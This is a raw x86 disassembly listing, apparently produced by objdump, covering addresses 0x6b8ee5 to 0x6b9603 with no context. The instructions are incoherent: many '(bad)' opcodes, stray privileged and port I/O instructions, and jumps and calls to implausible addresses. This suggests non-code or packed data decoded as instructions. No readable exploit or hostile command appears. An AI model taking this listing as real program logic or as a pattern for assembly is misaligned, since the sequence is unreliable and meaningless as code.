  6b8ee5:	fsubr  QWORD PTR [edi+0x42c6614b]
  6b8eeb:	(bad)  
  6b8eec:	xor    DWORD PTR [eax],ecx
  6b8eee:	es popa 
  6b8ef0:	fdiv   st,st(3)
  6b8ef2:	xor    al,0x7
  6b8ef4:	xchg   ecx,eax
  6b8ef5:	pop    esp
  6b8ef6:	jl     0x6b8ef9
  6b8ef8:	fldenv [esi]
  6b8efa:	inc    ecx
  6b8efb:	mov    ebp,DWORD PTR [esi]
  6b8efd:	loope  0x6b8ede
  6b8eff:	dec    ebp
  6b8f00:	js     0x6b8f5c
  6b8f02:	pop    ecx
  6b8f03:	ds push 0x11
  6b8f06:	sar    BYTE PTR [eax],1
  6b8f08:	daa    
  6b8f09:	inc    ebp
  6b8f0a:	push   es
  6b8f0b:	ret    0x99cd
  6b8f0e:	retf   0xde20
  6b8f11:	daa    
  6b8f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b8f13:	push   0xffffff97
  6b8f15:	push   ss
  6b8f16:	jo     0x6b8edc
  6b8f18:	iret   
  6b8f19:	pop    edx
  6b8f1a:	sub    DWORD PTR [eax-0x6bc53bc1],edi
  6b8f20:	ret    0xdb93
  6b8f23:	nop
  6b8f24:	add    DWORD PTR [ebx-0x4f],ebx
  6b8f27:	leave  
  6b8f28:	test   eax,0xebaefb8e
  6b8f2d:	cs clc 
  6b8f2f:	mov    cs,ecx
  6b8f31:	std    
  6b8f32:	fbld   TBYTE PTR [edx+0x76]
  6b8f35:	pusha  
  6b8f36:	hlt    
  6b8f37:	mov    ecx,0xeb514787
  6b8f3c:	fcomp  DWORD PTR [ebx+0x44c81c88]
  6b8f42:	cmc    
  6b8f43:	sar    BYTE PTR [esi+edi*2],0xfe
  6b8f47:	inc    esp
  6b8f48:	aam    0x1f
  6b8f4a:	ins    BYTE PTR es:[edi],dx
  6b8f4b:	push   ecx
  6b8f4c:	dec    esp
  6b8f4d:	icebp  
  6b8f4e:	iret   
  6b8f4f:	repnz xchg edx,eax
  6b8f51:	aaa    
  6b8f52:	call   0xc946b737
  6b8f57:	mov    bh,0x52
  6b8f59:	and    ebx,DWORD PTR [eax+0x1703ca48]
  6b8f5f:	test   BYTE PTR [eax+0x1fe5a3b9],al
  6b8f65:	xor    BYTE PTR [edx+0x51],cl
  6b8f68:	xchg   edx,eax
  6b8f69:	mov    esp,0x2cda0ae8
  6b8f6e:	neg    edx
  6b8f70:	cmp    BYTE PTR [ecx],al
  6b8f72:	iret   
  6b8f73:	pop    edi
  6b8f74:	jae    0x6b8f0b
  6b8f76:	shl    BYTE PTR [ebp-0x171281d2],0x5f
  6b8f7d:	dec    esi
  6b8f7e:	mov    WORD PTR [ebp+0x1faf4c5a],ss
  6b8f84:	mov    DWORD PTR [esi],esi
  6b8f86:	mov    al,ds:0x29cba46a
  6b8f8b:	retf   
  6b8f8c:	sbb    eax,0xd269232b
  6b8f91:	sub    edi,0x32
  6b8f94:	xchg   edi,eax
  6b8f95:	pop    ds
  6b8f96:	push   edi
  6b8f97:	jae    0x6b8f47
  6b8f99:	adc    ch,BYTE PTR [edx+0x3e3ca91f]
  6b8f9f:	in     al,dx
  6b8fa0:	enter  0x1365,0x1
  6b8fa4:	dec    esi
  6b8fa5:	aam    0x3b
  6b8fa7:	xchg   ebx,eax
  6b8fa8:	into   
  6b8fa9:	loope  0x6b8fb4
  6b8fab:	arpl   WORD PTR [ebx+edi*4+0x28933137],cx
  6b8fb2:	popa   
  6b8fb3:	adc    eax,0xaa7e2d3
  6b8fb8:	jg     0x6b8f44
  6b8fba:	and    ecx,eax
  6b8fbc:	mov    eax,0xd615cf9c
  6b8fc1:	adc    BYTE PTR [ecx-0x56b5da91],ah
  6b8fc7:	add    BYTE PTR [edx+0x7e76fa62],ch
  6b8fcd:	bound  esi,QWORD PTR [edi+0x7b]
  6b8fd0:	jle    0x6b8f53
  6b8fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b8fd3:	fidiv  DWORD PTR [edi]
  6b8fd5:	xchg   edx,eax
  6b8fd6:	mov    edx,0x92b3245d
  6b8fdb:	xchg   edi,eax
  6b8fdc:	clc    
  6b8fdd:	test   eax,esp
  6b8fdf:	add    ebx,DWORD PTR [eax-0x146e4853]
  6b8fe5:	push   ebx
  6b8fe6:	jle    0x6b904f
  6b8fe8:	(bad)  
  6b8fe9:	cmp    eax,0x679ea40e
  6b8fee:	aam    0xac
  6b8ff0:	popf   
  6b8ff1:	xor    al,0x2b
  6b8ff3:	dec    esi
  6b8ff4:	mov    ds:0x200f6cfe,al
  6b8ff9:	fsub   QWORD PTR [ebp-0x2]
  6b8ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b8ffd:	and    al,0x46
  6b8fff:	push   eax
  6b9000:	shl    DWORD PTR [edx],0x42
  6b9003:	mov    ecx,0xb188a65f
  6b9008:	mov    edx,esi
  6b900a:	jle    0x6b8fde
  6b900c:	stc    
  6b900d:	pushf  
  6b900e:	or     edx,0xe17de499
  6b9014:	cmp    BYTE PTR [eax-0x6764cb3f],bl
  6b901a:	mov    ebp,0xe1b270a4
  6b901f:	or     BYTE PTR [edi-0x71],al
  6b9022:	pop    eax
  6b9023:	ror    esi,cl
  6b9025:	(bad)  
  6b9026:	and    DWORD PTR [edi],esp
  6b9028:	fdiv   QWORD PTR [eax-0x598eb304]
  6b902e:	mov    esi,0x4fe70361
  6b9033:	outs   dx,DWORD PTR ds:[esi]
  6b9034:	rol    DWORD PTR [ebp-0x4173781f],0xbd
  6b903b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b903c:	ins    BYTE PTR es:[edi],dx
  6b903d:	nop
  6b903e:	(bad)  
  6b903f:	(bad)
  6b9043:	(bad)  
  6b9044:	test   eax,0x4e6e9387
  6b9049:	inc    ebx
  6b904a:	fcomp  DWORD PTR [ebx-0x6eae9bf0]
  6b9050:	(bad)  
  6b9051:	bound  edi,QWORD PTR [eax-0x1db6ad05]
  6b9057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b9058:	pop    esi
  6b9059:	test   eax,0xf82bf955
  6b905e:	dec    esp
  6b905f:	sbb    ebx,edx
  6b9061:	scas   al,BYTE PTR es:[edi]
  6b9062:	xor    esp,esp
  6b9064:	push   ebx
  6b9065:	dec    ecx
  6b9066:	and    dh,BYTE PTR [ecx+0x3ff3cb53]
  6b906c:	cmp    cl,dl
  6b906e:	sbb    eax,0xa909beef
  6b9073:	cmp    esi,0xffffffd1
  6b9076:	adc    al,0xd6
  6b9078:	dec    ebx
  6b9079:	shl    DWORD PTR [esi],0xd0
  6b907c:	call   FWORD PTR [eax-0x16da0504]
  6b9082:	imul   edx,DWORD PTR [edi+0x7f],0xffffffb8
  6b9086:	call   0x1138016f
  6b908b:	int    0x52
  6b908d:	pop    eax
  6b908e:	xchg   edi,eax
  6b908f:	sub    al,bl
  6b9091:	inc    edx
  6b9092:	imul   ecx,DWORD PTR ds:0x434271d6,0xffffff83
  6b9099:	jnp    0x6b90ae
  6b909b:	xchg   edx,eax
  6b909c:	sbb    DWORD PTR [eax],esp
  6b909e:	js     0x6b9029
  6b90a0:	cmp    eax,0xf4c9cd76
  6b90a5:	push   ebx
  6b90a6:	jbe    0x6b9127
  6b90a8:	ret    
  6b90a9:	fcmove st,st(6)
  6b90ab:	sub    al,0x69
  6b90ad:	stos   BYTE PTR es:[edi],al
  6b90ae:	jecxz  0x6b907c
  6b90b0:	test   eax,0x52c1751c
  6b90b5:	xor    eax,0x8bb8957d
  6b90ba:	cmp    edx,eax
  6b90bc:	xor    ah,cl
  6b90be:	test   eax,0x23d22da1
  6b90c3:	scas   eax,DWORD PTR es:[edi]
  6b90c4:	call   0xee65026a
  6b90c9:	jmp    FWORD PTR ss:[edi-0x31]
  6b90cd:	mov    dl,0xbc
  6b90cf:	iret   
  6b90d0:	cld    
  6b90d1:	push   esi
  6b90d2:	(bad)  
  6b90d3:	icebp  
  6b90d4:	stc    
  6b90d5:	lods   al,BYTE PTR ds:[esi]
  6b90d6:	stos   DWORD PTR es:[edi],eax
  6b90d7:	jns    0x6b913f
  6b90d9:	(bad)  
  6b90da:	xchg   ebx,eax
  6b90db:	cmp    DWORD PTR [ecx],ecx
  6b90dd:	push   edx
  6b90de:	stos   DWORD PTR es:[edi],eax
  6b90df:	mov    dl,dl
  6b90e1:	call   0x353a:0x63df2e0e
  6b90e8:	out    0xb2,al
  6b90ea:	outs   dx,DWORD PTR ds:[esi]
  6b90eb:	sbb    esi,0xffffffa2
  6b90ee:	dec    ecx
  6b90ef:	push   es
  6b90f0:	pop    eax
  6b90f1:	in     eax,0x2
  6b90f3:	mov    ebp,esi
  6b90f5:	mov    eax,ds:0xadde0439
  6b90fa:	int3   
  6b90fb:	out    dx,al
  6b90fc:	outs   dx,BYTE PTR ds:[esi]
  6b90fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b90fe:	ret    0xe057
  6b9101:	mov    al,ds:0x438779e8
  6b9106:	mov    eax,DWORD PTR [edi+0x6b]
  6b9109:	sti    
  6b910a:	xor    ecx,DWORD PTR [edi]
  6b910c:	stos   BYTE PTR es:[edi],al
  6b910d:	jbe    0x6b90fd
  6b910f:	dec    edi
  6b9110:	inc    esi
  6b9111:	pushf  
  6b9112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b9113:	(bad)  
  6b9115:	repnz mov ch,0xda
  6b9118:	xchg   edi,eax
  6b9119:	mov    edi,ds
  6b911b:	(bad)  
  6b911c:	out    dx,eax
  6b911d:	jns    0x6b90a4
  6b911f:	pop    edi
  6b9120:	inc    esi
  6b9121:	(bad)
  6b9125:	mov    dl,0x10
  6b9127:	js     0x6b9103
  6b9129:	sbb    ebp,edi
  6b912b:	and    eax,0x63931bd2
  6b9130:	xchg   edx,eax
  6b9131:	mov    ebp,0xdf568643
  6b9136:	xor    DWORD PTR [esi-0x4e],ecx
  6b9139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b913a:	repnz das 
  6b913c:	retf   0xee72
  6b913f:	xor    BYTE PTR [edx],bl
  6b9141:	xchg   ecx,eax
  6b9142:	sub    al,0x36
  6b9144:	shl    BYTE PTR [esi+esi*1-0x7751fa84],cl
  6b914b:	outs   dx,BYTE PTR ds:[esi]
  6b914c:	ins    BYTE PTR es:[edi],dx
  6b914d:	jmp    0xfd7888b6
  6b9152:	lock hlt 
  6b9154:	icebp  
  6b9155:	and    dl,BYTE PTR [ebx]
  6b9157:	cmp    dh,BYTE PTR [ebx]
  6b9159:	mov    eax,ds:0xfdd05f11
  6b915e:	mov    al,0x5f
  6b9160:	ins    BYTE PTR es:[edi],dx
  6b9161:	sub    DWORD PTR [ebp-0x7],esp
  6b9164:	lods   eax,DWORD PTR ds:[esi]
  6b9165:	pop    esp
  6b9166:	stc    
  6b9167:	arpl   WORD PTR [ebp+0x76],sp
  6b916a:	dec    edx
  6b916b:	cmp    BYTE PTR [esi+0x51],bl
  6b916e:	pop    ecx
  6b916f:	in     al,dx
  6b9170:	repnz iret 
  6b9172:	and    ah,al
  6b9174:	out    dx,al
  6b9175:	out    dx,al
  6b9176:	hlt    
  6b9177:	lahf   
  6b9178:	lahf   
  6b9179:	pop    ds
  6b917a:	add    BYTE PTR [ecx-0x7c],dl
  6b917d:	xor    ebx,DWORD PTR [ebx-0x313a8eae]
  6b9183:	popf   
  6b9184:	mov    al,ds:0x8d918219
  6b9189:	mov    eax,0x47cf0385
  6b918e:	push   ds
  6b918f:	and    al,0xf6
  6b9191:	push   esi
  6b9192:	(bad)  
  6b9193:	lds    eax,FWORD PTR [edx-0x2a41c31a]
  6b9199:	call   0x3276:0x83186926
  6b91a0:	pop    ds
  6b91a1:	fisub  WORD PTR [ebx+0x51]
  6b91a4:	test   DWORD PTR [ecx],ebp
  6b91a6:	ja     0x6b9175
  6b91a8:	mov    ecx,0x86883a14
  6b91ad:	std    
  6b91ae:	cld    
  6b91af:	loop   0x6b91dc
  6b91b1:	xchg   esi,eax
  6b91b2:	shl    BYTE PTR [ebx-0x53],cl
  6b91b5:	aas    
  6b91b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b91b7:	ja     0x6b9187
  6b91b9:	sub    al,0x5d
  6b91bb:	sub    BYTE PTR [ebx+0xa],ch
  6b91be:	sub    BYTE PTR [edx+0x52],ch
  6b91c1:	js     0x6b91b9
  6b91c3:	fidivr DWORD PTR [edx-0x514a4b61]
  6b91c9:	fwait
  6b91ca:	add    BYTE PTR [eax+0xebb8597],bh
  6b91d0:	mov    ah,0x87
  6b91d2:	clc    
  6b91d3:	pop    gs
  6b91d5:	lahf   
  6b91d6:	cmc    
  6b91d7:	in     eax,0xa0
  6b91d9:	mov    BYTE PTR [edx],0x39
  6b91dc:	mov    eax,0x4c316a49
  6b91e1:	or     al,BYTE PTR [edi-0x68]
  6b91e4:	lods   al,BYTE PTR ds:[esi]
  6b91e5:	into   
  6b91e6:	dec    ebx
  6b91e7:	retf   
  6b91e8:	test   eax,0xe00b39a8
  6b91ed:	outs   dx,BYTE PTR ds:[esi]
  6b91ee:	stos   BYTE PTR es:[edi],al
  6b91ef:	sti    
  6b91f0:	mov    ds:0x6a331d21,eax
  6b91f5:	aas    
  6b91f6:	sti    
  6b91f7:	jae    0x6b9248
  6b91f9:	ds retf 
  6b91fb:	sbb    ch,BYTE PTR [eax-0x7b0329a8]
  6b9201:	sub    esi,DWORD PTR [esi-0x1d]
  6b9204:	mov    edx,0x1be47910
  6b9209:	mov    ecx,0x5573bdad
  6b920e:	inc    esi
  6b920f:	or     DWORD PTR [edx+edx*4],ebx
  6b9212:	xor    eax,0x49d88d20
  6b9217:	pop    edx
  6b9218:	xor    BYTE PTR [edx+edi*1-0x42f505bb],dl
  6b921f:	dec    edx
  6b9220:	pop    ss
  6b9221:	mov    ah,al
  6b9223:	xchg   esp,eax
  6b9224:	dec    edi
  6b9225:	(bad)  
  6b9226:	jo     0x6b922e
  6b9228:	hlt    
  6b9229:	rcr    eax,cl
  6b922b:	and    eax,0x8cea94df
  6b9230:	out    0xcf,al
  6b9232:	mov    al,0xd
  6b9234:	add    eax,0xe09417fe
  6b9239:	xchg   edx,eax
  6b923a:	xchg   ebx,eax
  6b923b:	stos   DWORD PTR es:[edi],eax
  6b923c:	ss mov esi,0x4590b11d
  6b9242:	cmp    bh,dh
  6b9244:	mov    ebx,0x8912cf96
  6b9249:	out    0x57,al
  6b924b:	shl    DWORD PTR [ebp-0x41b078a4],1
  6b9251:	repnz rol BYTE PTR [ebp+0x47654966],1
  6b9258:	fs dec esp
  6b925a:	pop    esp
  6b925b:	ss ret 0x5d8f
  6b925f:	or     dl,BYTE PTR [ecx+0x77]
  6b9262:	repz xor DWORD PTR [ecx-0x47],ecx
  6b9266:	repz or BYTE PTR [esi],0x28
  6b926a:	cmp    eax,edx
  6b926c:	mov    BYTE PTR [ebp+ebx*8-0x35],0xb8
  6b9271:	retf   
  6b9272:	fisttp WORD PTR [ebx]
  6b9274:	loop   0x6b9298
  6b9276:	pusha  
  6b9277:	loope  0x6b9249
  6b9279:	cli    
  6b927a:	int    0xc
  6b927c:	(bad)  
  6b927d:	out    0x4b,eax
  6b927f:	lods   al,BYTE PTR ds:[esi]
  6b9280:	stc    
  6b9281:	jl     0x6b9217
  6b9283:	cmc    
  6b9284:	xor    al,0x41
  6b9286:	lods   al,BYTE PTR ds:[esi]
  6b9287:	xchg   BYTE PTR [ebx+esi*2+0x2070f03e],ah
  6b928e:	nop
  6b928f:	imul   edi,esi,0x8bf6a4dc
  6b9295:	nop
  6b9296:	dec    ebp
  6b9297:	es or  ecx,eax
  6b929a:	(bad)  [ebp+0x524c60b]
  6b92a0:	(bad)  
  6b92a1:	outs   dx,DWORD PTR ds:[esi]
  6b92a2:	or     BYTE PTR [eax-0x49],0xd9
  6b92a6:	outs   dx,DWORD PTR ds:[esi]
  6b92a7:	pop    edx
  6b92a8:	cmc    
  6b92a9:	leave  
  6b92aa:	and    BYTE PTR [esi+0xc],0x19
  6b92ae:	push   esi
  6b92af:	adc    ch,cl
  6b92b1:	out    0x3f,al
  6b92b3:	std    
  6b92b4:	or     BYTE PTR [esi],dh
  6b92b6:	popf   
  6b92b7:	mov    esi,0x10fabb98
  6b92bc:	jle    0x6b92cd
  6b92be:	sub    BYTE PTR [esi+eiz*8-0x6b8a7cd9],dh
  6b92c5:	jp     0x6b9290
  6b92c7:	inc    esp
  6b92c8:	mov    ds:0xc37e174d,eax
  6b92cd:	sbb    dl,cl
  6b92cf:	cmp    eax,0xe6f17c63
  6b92d4:	retf   
  6b92d5:	push   eax
  6b92d6:	cmp    cl,BYTE PTR ds:[ebp+0x78]
  6b92da:	xor    DWORD PTR [ebx+0x75c66fc4],eax
  6b92e0:	dec    ecx
  6b92e1:	add    eax,0x390313c5
  6b92e6:	mov    cl,0x5e
  6b92e8:	into   
  6b92e9:	sti    
  6b92ea:	mov    ebx,0x82d78522
  6b92ef:	fs daa 
  6b92f1:	in     eax,0xe9
  6b92f3:	push   0x278c3e23
  6b92f8:	fist   WORD PTR [edi-0x6926e4cb]
  6b92fe:	push   edi
  6b92ff:	add    eax,0x42632358
  6b9304:	je     0x6b92e3
  6b9306:	scas   al,BYTE PTR es:[edi]
  6b9307:	inc    ecx
  6b9308:	js     0x6b9353
  6b930a:	jle    0x6b92a0
  6b930c:	cwde   
  6b930d:	daa    
  6b930e:	or     BYTE PTR [esi-0x37],dh
  6b9311:	out    dx,al
  6b9312:	and    dl,BYTE PTR [edx]
  6b9314:	cmp    ch,BYTE PTR [edi+0x5026adbb]
  6b931a:	lods   al,BYTE PTR ds:[esi]
  6b931b:	aas    
  6b931c:	lds    ecx,FWORD PTR [eax+0x34]
  6b931f:	sti    
  6b9320:	das    
  6b9321:	inc    esi
  6b9322:	(bad)  [edi]
  6b9324:	ins    BYTE PTR es:[edi],dx
  6b9325:	add    esi,ecx
  6b9327:	mov    gs,WORD PTR [edi]
  6b9329:	sbb    eax,0x8c1abfd8
  6b932e:	and    ah,BYTE PTR [edi-0x5ac5b3f]
  6b9334:	pop    ds
  6b9335:	imul   ebx,DWORD PTR [esi],0xffffff94
  6b9338:	and    al,bl
  6b933a:	shl    cl,cl
  6b933c:	push   esp
  6b933d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b933e:	in     eax,0xcc
  6b9340:	mov    ds:0xe523c5ab,al
  6b9345:	jecxz  0x6b9395
  6b9347:	in     eax,dx
  6b9348:	popa   
  6b9349:	pop    edx
  6b934a:	ret    
  6b934b:	and    dh,dl
  6b934d:	lods   eax,DWORD PTR ds:[esi]
  6b934e:	loopne 0x6b9387
  6b9350:	fiadd  DWORD PTR [esi-0x7c60fc89]
  6b9356:	mov    cl,0x8
  6b9358:	out    dx,al
  6b9359:	mov    WORD PTR [edi+0x1],?
  6b935c:	sub    al,0x58
  6b935e:	rol    eax,0xc9
  6b9361:	in     eax,0x2f
  6b9363:	dec    eax
  6b9364:	lods   al,BYTE PTR ds:[esi]
  6b9365:	(bad)  
  6b9366:	mov    dl,dh
  6b9368:	arpl   WORD PTR [ebx+eiz*1-0x6d],bx
  6b936c:	jmp    FWORD PTR [ecx-0xec9b7b9]
  6b9372:	outs   dx,DWORD PTR ds:[esi]
  6b9373:	add    esp,DWORD PTR [edi]
  6b9375:	xor    DWORD PTR [ecx-0x42],0x734618ad
  6b937c:	pop    eax
  6b937d:	push   ebx
  6b937e:	push   ecx
  6b937f:	into   
  6b9380:	out    dx,al
  6b9381:	stos   BYTE PTR es:[edi],al
  6b9382:	xchg   ebx,eax
  6b9383:	shl    DWORD PTR [edx-0x189b7a87],0x75
  6b938a:	dec    edi
  6b938b:	into   
  6b938c:	xor    DWORD PTR [eax],0x47
  6b938f:	xor    ch,ch
  6b9391:	fidiv  DWORD PTR [ebx-0x70590539]
  6b9397:	popf   
  6b9398:	fild   WORD PTR [edi-0x6c]
  6b939b:	repnz lea esp,[edi]
  6b939e:	fld    QWORD PTR [edx]
  6b93a0:	sub    ah,BYTE PTR [edx+0x57]
  6b93a3:	leave  
  6b93a4:	ins    DWORD PTR es:[edi],dx
  6b93a5:	xlat   BYTE PTR ds:[ebx]
  6b93a6:	shl    DWORD PTR [ebp+0x1700ce70],0x51
  6b93ad:	and    esp,esp
  6b93af:	xor    al,0x4d
  6b93b1:	mov    ecx,0x2fb757d
  6b93b6:	mov    ds:0xa27abc9f,eax
  6b93bb:	cdq    
  6b93bc:	ret    
  6b93bd:	in     eax,0xcd
  6b93bf:	push   ecx
  6b93c0:	mov    edi,0x12a192b6
  6b93c5:	fistp  WORD PTR ds:0x948d31ee
  6b93cb:	mov    BYTE PTR [edx+0x49],ch
  6b93ce:	cmp    eax,0x62733164
  6b93d3:	mov    ebp,0x5632e6f6
  6b93d8:	inc    eax
  6b93d9:	pop    ebx
  6b93da:	sbb    DWORD PTR [edi+0x461b8081],eax
  6b93e0:	jns    0x6b942b
  6b93e2:	ins    DWORD PTR es:[edi],dx
  6b93e3:	sbb    bh,BYTE PTR [edi+0x73]
  6b93e6:	pop    ebp
  6b93e7:	and    al,0x4c
  6b93e9:	cmp    BYTE PTR [ebp+0x2a2685b1],dh
  6b93ef:	sub    BYTE PTR [ebp-0x3a],cl
  6b93f2:	(bad)  
  6b93f3:	or     al,0xee
  6b93f5:	mov    ebp,0xb143a466
  6b93fa:	cmp    al,0xf1
  6b93fc:	xlat   BYTE PTR ds:[ebx]
  6b93fd:	icebp  
  6b93fe:	repnz xor ecx,0x21
  6b9402:	mov    al,0xf9
  6b9404:	push   es
  6b9405:	arpl   ax,dx
  6b9407:	or     cl,BYTE PTR [edx+0x2c]
  6b940a:	faddp  st(2),st
  6b940c:	xchg   esi,eax
  6b940d:	cmp    eax,0xe2f05de5
  6b9412:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  6b9414:	cmp    edx,DWORD PTR [edx]
  6b9416:	dec    edi
  6b9417:	ja     0x6b9478
  6b9419:	cmp    ah,BYTE PTR [ebx-0xb]
  6b941c:	xchg   DWORD PTR [edi+0x2e6ceec7],esp
  6b9422:	jne    0x6b93d0
  6b9424:	pusha  
  6b9425:	xchg   esp,eax
  6b9426:	xor    al,BYTE PTR [edi+ebx*8+0x3b]
  6b942a:	push   esp
  6b942b:	mov    edx,0x1ab22a3c
  6b9430:	lods   eax,DWORD PTR ds:[esi]
  6b9431:	dec    ecx
  6b9432:	xchg   edx,eax
  6b9433:	arpl   WORD PTR [edi+0x2e4ddcda],ax
  6b9439:	push   ecx
  6b943a:	jg     0x6b9478
  6b943c:	in     eax,dx
  6b943d:	sbb    esi,DWORD PTR [edi-0x17021b9b]
  6b9443:	std    
  6b9444:	nop
  6b9445:	push   edi
  6b9446:	and    al,0xae
  6b9448:	adc    cl,bl
  6b944a:	js     0x6b942d
  6b944c:	cmp    BYTE PTR [esi+ecx*4+0x20],cl
  6b9450:	lock inc ecx
  6b9452:	adc    ch,ah
  6b9454:	cmp    ah,BYTE PTR [ebp-0x48]
  6b9457:	sub    dl,BYTE PTR [esi+ebx*8]
  6b945a:	ret    0x79c
  6b945d:	jns    0x6b93e7
  6b945f:	pop    esp
  6b9460:	mov    BYTE PTR [eax],bl
  6b9462:	sub    al,0x3e
  6b9464:	test   BYTE PTR [eax-0x27],dh
  6b9467:	rcl    DWORD PTR [eax-0x66fa857b],0x27
  6b946e:	sbb    eax,esi
  6b9470:	int3   
  6b9471:	test   DWORD PTR [edx],0xa0f9cd2a
  6b9477:	adc    BYTE PTR [ecx+0x50],ch
  6b947a:	out    0xed,eax
  6b947c:	icebp  
  6b947d:	inc    edx
  6b947e:	not    BYTE PTR [esp+esi*8]
  6b9481:	push   edx
  6b9482:	mov    al,0xd6
  6b9484:	call   0x8e5d410
  6b9489:	cmp    eax,0x7c166290
  6b948e:	xor    al,0x30
  6b9490:	sti    
  6b9491:	mov    ds:0xb66a9a1d,eax
  6b9496:	(bad)  
  6b9497:	test   eax,0x83ad6528
  6b949c:	xor    edi,DWORD PTR [esi-0x47]
  6b949f:	cmp    cl,dh
  6b94a1:	xchg   esi,eax
  6b94a2:	jge    0x6b94b1
  6b94a4:	in     eax,dx
  6b94a5:	or     al,0x1f
  6b94a7:	pop    esp
  6b94a8:	fwait
  6b94a9:	add    cl,dh
  6b94ab:	(bad)  
  6b94ac:	shl    DWORD PTR [esi-0x7638896b],1
  6b94b2:	inc    ebx
  6b94b3:	and    dl,bl
  6b94b5:	cli    
  6b94b6:	jne    0x6b94c4
  6b94b8:	mov    eax,0xf67ea879
  6b94bd:	dec    ax
  6b94bf:	sbb    ch,BYTE PTR [esi-0x2fbba37c]
  6b94c5:	mov    esi,0x1007726
  6b94ca:	add    BYTE PTR [esp+edx*1-0x7b],bl
  6b94ce:	sar    DWORD PTR [ebp+0x17],0xe0
  6b94d2:	std    
  6b94d3:	jo     0x6b9463
  6b94d5:	mov    cl,0x47
  6b94d7:	shr    BYTE PTR [edi],cl
  6b94d9:	ror    DWORD PTR [eax+0xe],1
  6b94dc:	pop    eax
  6b94dd:	sbb    bl,dh
  6b94df:	push   ds
  6b94e0:	push   ebp
  6b94e1:	loopne 0x6b946e
  6b94e3:	xchg   esp,eax
  6b94e4:	dec    ecx
  6b94e5:	inc    ebp
  6b94e6:	retf   0x3353
  6b94e9:	cli    
  6b94ea:	mov    dh,0xef
  6b94ec:	sub    al,ah
  6b94ee:	xor    al,0xd
  6b94f0:	popf   
  6b94f1:	cld    
  6b94f2:	mov    bl,0x4b
  6b94f4:	mov    ds:0x4170813f,eax
  6b94f9:	es or  eax,0x7eb7b97d
  6b94ff:	shr    BYTE PTR [ecx-0x6f],1
  6b9502:	mov    ecx,0x67f1e909
  6b9507:	jmp    0xda688932
  6b950c:	ficomp DWORD PTR [eax-0x2cce0e9f]
  6b9512:	fst    QWORD PTR [eax]
  6b9514:	dec    esi
  6b9515:	or     eax,0xd75e7f0c
  6b951a:	sbb    eax,0x499bf760
  6b951f:	stos   BYTE PTR es:[edi],al
  6b9520:	aaa    
  6b9521:	or     al,0xa8
  6b9523:	xchg   BYTE PTR [esi-0x14cf8623],ah
  6b9529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b952a:	mov    ds:0xfdf6dfb5,eax
  6b952f:	add    cl,BYTE PTR [ebp+eiz*1+0x4d]
  6b9533:	imul   eax,DWORD PTR [edi+0x7dd582f],0x96eb399e
  6b953d:	jbe    0x6b957b
  6b953f:	xlat   BYTE PTR ds:[ebx]
  6b9540:	jnp    0x6b95ad
  6b9542:	out    0x73,eax
  6b9544:	push   ss
  6b9545:	lods   al,BYTE PTR ds:[esi]
  6b9546:	xchg   esp,eax
  6b9547:	or     eax,0x886ccf02
  6b954c:	jmp    0x6b958e
  6b954e:	popf   
  6b954f:	xor    eax,0x31377229
  6b9554:	mov    ds:0x7844701f,eax
  6b9559:	dec    ebp
  6b955a:	in     eax,dx
  6b955b:	mov    cl,0xe3
  6b955d:	mov    esp,0x86ad7273
  6b9562:	dec    ebp
  6b9563:	aam    0x12
  6b9565:	loopne 0x6b9534
  6b9567:	fdiv   st,st(2)
  6b9569:	mov    eax,0x386f2afb
  6b956e:	xor    dl,BYTE PTR [esi+0x36b52177]
  6b9574:	or     DWORD PTR [ebp+0x26],esi
  6b9577:	mov    dl,0x22
  6b9579:	mov    edi,0x48da6062
  6b957e:	enter  0x628,0x11
  6b9582:	and    DWORD PTR [ebx],esi
  6b9584:	cli    
  6b9585:	add    dl,BYTE PTR [ebx]
  6b9587:	pop    eax
  6b9588:	add    eax,0x5a1c1861
  6b958d:	sub    BYTE PTR [ecx-0x4f998e99],ah
  6b9593:	fidivr WORD PTR [esi]
  6b9595:	(bad)  
  6b9596:	push   ebp
  6b9597:	jl     0x6b953a
  6b9599:	cmc    
  6b959a:	push   0x96c9c54c
  6b959f:	jo     0x6b9614
  6b95a1:	cld    
  6b95a2:	les    edi,FWORD PTR [ebx+0x19]
  6b95a5:	inc    esp
  6b95a6:	cmp    eax,0x3506908a
  6b95ab:	push   cs
  6b95ac:	jge    0x6b958f
  6b95ae:	into   
  6b95af:	pop    edi
  6b95b0:	add    eax,0x49559acf
  6b95b5:	out    dx,al
  6b95b6:	or     al,0x90
  6b95b8:	push   ss
  6b95b9:	and    eax,0xc4038cff
  6b95be:	sahf   
  6b95bf:	push   0xd5f62b58
  6b95c4:	mov    dh,0x74
  6b95c6:	(bad)  
  6b95c7:	and    BYTE PTR [ebp+0x5ffe9f58],ah
  6b95cd:	ret    0x5cab
  6b95d0:	xor    DWORD PTR [esi],edx
  6b95d2:	loopne 0x6b9561
  6b95d4:	lods   eax,DWORD PTR ds:[esi]
  6b95d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b95d6:	pop    ebp
  6b95d7:	inc    ecx
  6b95d8:	cmp    BYTE PTR [eax+0x6438ee26],dh
  6b95de:	push   edi
  6b95df:	pop    es
  6b95e0:	push   ds
  6b95e1:	xchg   ebp,eax
  6b95e2:	jp     0x6b9592
  6b95e4:	sub    BYTE PTR [edx],cl
  6b95e6:	xchg   ebx,eax
  6b95e7:	test   eax,0xa1e326dc
  6b95ec:	sub    al,0x58
  6b95ee:	jnp    0x6b9577
  6b95f0:	dec    edx
  6b95f1:	scas   al,BYTE PTR es:[edi]
  6b95f2:	dec    edx
  6b95f3:	push   edx
  6b95f4:	mul    DWORD PTR [esi]
  6b95f6:	mov    dh,0xd
  6b95f8:	jo     0x6b95a8
  6b95fa:	jmp    0x6b963b
  6b95fc:	sub    eax,0x1f873e7c
  6b9601:	sbb    esp,DWORD PTR [ebx]
  6b9603:	mov    bl,0xa
